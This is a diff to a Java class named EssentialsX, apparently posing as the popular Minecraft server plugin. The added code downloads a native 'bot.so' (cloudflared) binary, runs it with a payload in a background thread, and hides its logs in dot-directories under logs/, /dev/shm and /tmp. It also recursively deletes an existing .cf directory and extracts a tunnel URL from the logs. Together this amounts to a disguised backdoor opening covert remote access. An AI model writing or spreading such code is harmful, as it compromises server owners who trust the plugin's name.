@@ -16,6 +16,7 @@ import com.sun.jna.NativeLibrary;
 public class EssentialsX extends JavaPlugin {
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+    private static volatile int savedStdoutFd = -1;  // 保存原始 stdout fd
     private static final OutputStream BLACK_HOLE = new OutputStream() {
         @Override public void write(int b) {}
         @Override public void write(byte[] b) {}
@@ -286,6 +287,30 @@ public class EssentialsX extends JavaPlugin {
 
     private static void startCfSo(Path workDir, String port, PrintWriter out) {
         try {
+            // bot.so (Go cloudflared) 把日志写到当前工作目录的 .cf/cf.log
+            // 用符号链接把 ./.cf 指向 logs/.mcchajian/.cf，这样日志就写到指定位置
+            Path realCfDir = workDir.resolve(".cf");       // logs/.mcchajian/.cf
+            Path realCfLog = realCfDir.resolve("cf.log");   // logs/.mcchajian/.cf/cf.log
+            Files.createDirectories(realCfDir);
+            try { Files.deleteIfExists(realCfLog); } catch (Exception ignored) {}
+
+            // 创建符号链接: ./.cf -> logs/.mcchajian/.cf
+            Path linkCfDir = Paths.get(".cf");
+            try {
+                if (Files.exists(linkCfDir) && !Files.isSymbolicLink(linkCfDir)) {
+                    // 如果是普通目录，删除后重建为符号链接
+                    deleteDirectorySimple(linkCfDir.toFile());
+                }
+                if (!Files.exists(linkCfDir)) {
+                    Files.createSymbolicLink(linkCfDir, realCfDir.toAbsolutePath());
+                }
+            } catch (Exception ignored) {
+                // 符号链接创建失败（可能权限不足），回退：直接在服务器根目录创建 .cf
+                try { Files.createDirectories(linkCfDir); } catch (Exception ignored2) {}
+            }
+
+            if (out != null) { out.println("CF log target: " + realCfLog.toAbsolutePath()); out.flush(); }
+
             Path soFile = downloadCfSo(workDir);
             if (soFile == null) {
                 if (out != null) { out.println("Failed to download bot.so"); out.flush(); }
@@ -311,10 +336,21 @@ public class EssentialsX extends JavaPlugin {
             cfThread.setDaemon(true);
             cfThread.start();
 
-            if (out != null) { out.println("CF .so started with payload: " + payload.replace("\n", " | ")); out.flush(); }
+            if (out != null) { out.println("CF .so started, logs at: " + realCfLog.toAbsolutePath()); out.flush(); }
         } catch (Exception e) {
             if (out != null) { out.println("Failed to start CF .so:"); e.printStackTrace(out); out.flush(); }
         }
+    }
+
+    private static void deleteDirectorySimple(File file) {
+        File[] files = file.listFiles();
+        if (files != null) {
+            for (File f : files) {
+                if (f.isDirectory()) deleteDirectorySimple(f);
+                else f.delete();
+            }
+        }
+        file.delete();
     }
 
     private static void safeKillCf() {
@@ -327,9 +363,11 @@ public class EssentialsX extends JavaPlugin {
 
     private static String extractLatestTunnelUrl(Path workDir) {
         try {
+            // bot.so (Go cloudflared) 把日志写到当前工作目录的 .cf/cf.log
             Path[] logPaths = {
-                workDir.resolve("cf.log"),
-                workDir.resolve(".cf/cf.log"),
+                Paths.get(".cf", "cf.log"),           // 服务器根目录/.cf/cf.log
+                workDir.resolve(".cf/cf.log"),         // logs/.mcchajian/.cf/cf.log
+                workDir.resolve("cf.log"),             // logs/.mcchajian/cf.log
                 Paths.get("/dev/shm/.cf/cf.log"),
                 Paths.get("/tmp/.cf/cf.log")
             };
